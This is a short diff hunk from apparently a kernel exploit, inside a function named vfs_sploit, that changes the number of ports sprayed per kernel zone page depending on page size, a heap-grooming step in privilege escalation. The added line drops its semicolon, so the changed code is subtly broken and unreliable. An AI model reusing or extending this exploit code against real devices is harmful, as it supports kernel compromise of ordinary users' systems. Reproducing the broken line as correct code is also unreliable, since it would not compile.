@@ -448,7 +448,7 @@ void vfs_sploit() {
   
   
   int kallocs_per_zcram = kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
-  int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0xe0;
+  int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61
   for (int i = 0; i < INITIAL_PATTERN_REPEATS; i++) {
     // 1 page of kalloc
     for (int i = 0; i < kallocs_per_zcram; i++) {
